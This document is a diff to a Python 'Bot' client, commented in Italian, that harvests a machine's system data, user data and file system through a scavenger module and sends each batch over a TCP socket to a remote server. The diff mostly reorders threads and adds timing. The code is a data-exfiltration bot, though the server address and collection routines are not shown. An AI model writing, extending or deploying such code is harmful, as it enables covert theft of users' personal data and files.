@@ -1,5 +1,6 @@
 import socket
 import struct
+import time
 
 import systemRetrieval
 from time import sleep
@@ -18,29 +19,21 @@ class Bot:
     def __init__(self):
         self.Scavenger = systemRetrieval.InformationScavanger()
 
+        self.start_time = time.time()
         self.data_sentence = ''
         self.fileSystem_sentence = ''
-
         self.send_sentence = ''
 
         self.clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+        # Thread incaricato dell'effettiva comunicazione del client con il server.
+        self.thread_connection = threading.Thread(target=self.waitForConnection)
+
         # Thread incaricato del recupero dei dati e del calcolo della loro dimensione.
         self.thread_data = threading.Thread(target=self.dataScavange)
 
-        # Thread incaricato del recupero dei dati dell'utente.
-        self.thread_user = threading.Thread(target=self.userScavenge)
-
-        # Thread incaricato dell'effettiva comunicazione con il server.
-        self.thread_connection = threading.Thread(target=self.waitForConnection)
-
-        # Thread incaricato del recupero del file system.
-        self.thread_fileSystem = threading.Thread(target=self.fileSystemScavange)
-
         self.thread_data.start()
         self.thread_connection.start()
-        self.thread_fileSystem.start()
-        self.thread_user.start()
 
     def waitForConnection(self):
         """
@@ -56,25 +49,18 @@ class Bot:
         while self.thread_data.is_alive():
             sleep(2)
 
-        # Possiamo ora inviare i dati raccolti in formato .json.
+        # Possiamo ora inviare i dati raccolti in formato .json
         self.sendToServer()
 
-        while self.thread_user.is_alive():
-            sleep(2)
-
-        # manda dati dell'utente
+        self.userScavenge()
         self.sendToServer()
 
-        # Il Bot attende la fine del thread file system prima di mandare i dati.
-        while self.thread_fileSystem.is_alive():
-            sleep(2)
-
-        # Possiamo ora inviare i dati raccolti in formato txt
+        self.fileSystemScavange()
         self.sendToServer()
 
         self.clientSocket.close()
-
         print("thread_connection terminated.")
+        print("Tempo passato: ", time.time() - self.start_time)
 
     def dataScavange(self):
         """
@@ -90,7 +76,7 @@ class Bot:
     def userScavenge(self):
         # prende dati user
         self.send_sentence = self.Scavenger.retriveUser()
-        print("thread_user terminated.")
+        print("user data sent.")
 
     def fileSystemScavange(self):
         inputSentence = self.Scavenger.fileSystemRetrival()
@@ -100,7 +86,7 @@ class Bot:
 
     def sendToServer(self, data=''):
         """
-        Il client invia al server i dati raccolti in formato .json.
+        Il client invia al server i dati raccolti in formato .json
         :parameter data eventuale dato da inviare, altrimenti invia la send sentence della classe
         :return: None
         """
@@ -115,7 +101,6 @@ class Bot:
         except BrokenPipeError as error:
             print(error)
 
-    # TODO: dobbiamo affrontare il problema dell'invio del filesystem dato che le funzioni di send e recv sono cambiate
     def send_message(self, msg):
         msg = struct.pack('>I', len(msg)) + msg
         self.clientSocket.sendall(msg)
